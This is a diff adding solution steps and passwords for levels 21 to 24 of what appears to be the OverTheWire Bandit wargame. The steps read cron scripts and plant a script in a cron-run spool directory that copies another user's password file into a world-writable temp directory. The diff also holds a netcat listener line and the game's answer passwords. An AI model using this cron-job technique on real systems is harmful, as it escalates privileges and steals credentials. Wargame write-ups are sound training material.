@@ -229,3 +229,56 @@ echo -n '4pIjcunZ0fK2vmp3IwfG8Vf7VhxD6pOA' | nc -l -p 1234 &
 bW9kBv5WC3P4yoDyf12LSdGuNz5ka6hY
 ```
 
+## Level 21 → 22
+
+```bash
+cat /etc/cron.d/cronjob_bandit22
+cat  /usr/bin/cronjob_bandit22.sh
+cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+```
+
+```text
+RYVux2rHEm9tiXHmLFzuR7Vhx6AZQMEz
+```
+
+## Level 22 → 23
+
+```bash
+cat /etc/cron.d/cronjob_bandit23
+cat  /usr/bin/cronjob_bandit23.sh
+echo I am user bandit23 | md5sum | cut -d ' ' -f 1
+cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+```
+
+```text
+gKXDTAXnIz3OBxiPjRZ2uqutUlPZrBsw
+```
+
+## Level 23 → 24
+
+```bash
+cat /etc/cron.d/cronjob_bandit24
+
+cat /usr/bin/cronjob_bandit24.sh
+
+mktemp -d
+
+chmod 777 /tmp/tmp.NJjseRy9cK
+
+job.sh
+
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/tmp.NJjseRy9cK/result
+
+chmod 755 /tmp/tmp.NJjseRy9cK/job.sh
+cp /tmp/tmp.NJjseRy9cK/job.sh /var/spool/bandit24/foo/job.sh
+
+sleep 65
+
+cat /tmp/tmp.NJjseRy9cK/result
+
+```
+
+```text
+hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv
+```
